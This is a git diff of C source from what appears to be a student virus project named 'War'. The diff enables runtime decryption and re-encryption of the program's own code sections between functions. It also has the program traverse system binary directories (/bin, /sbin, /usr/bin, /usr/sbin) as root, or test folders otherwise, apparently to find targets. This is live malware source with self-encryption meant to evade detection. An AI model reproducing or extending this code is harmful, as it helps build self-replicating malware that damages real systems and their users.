@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:17:19 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/01 18:07:27 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/02 11:32:14 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,7 +14,7 @@
 
 void	war(t_data *data)
 {
-	/* revert_one(&data->key, (char*)opening, (size_t)war - (size_t)opening); */
+	revert_one(&data->key, (char*)opening, (size_t)war - (size_t)opening);
 
 #ifdef DEBUG
 	char de[] = "war\t \n";
@@ -29,8 +29,8 @@ void	war(t_data *data)
 	{
 		t_directory root = {_random_number(ROOT_ENTRY), {"/bin", "/sbin", "/usr/bin", "/usr/sbin"}};
 
-		/* update_one(&data->key, (char*)war, (size_t)locate - (size_t)war); */
-		/* revert_one(&data->key, (char*)locate, (size_t)inspect - (size_t)locate); */
+		update_one(&data->key, (char*)war, (size_t)locate - (size_t)war);
+		revert_one(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
 
 		locate(data, &root);
 	}
@@ -38,8 +38,8 @@ void	war(t_data *data)
 	{
 		t_directory user = {_random_number(USER_ENTRY), {"/tmp/test", "/tmp/test2"}};
 
-		/* update_one(&data->key, (char*)war, (size_t)locate - (size_t)war); */
-		/* revert_one(&data->key, (char*)locate, (size_t)inspect - (size_t)locate); */
+		update_one(&data->key, (char*)war, (size_t)locate - (size_t)war);
+		revert_one(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
 
 		locate(data, &user);
 	}
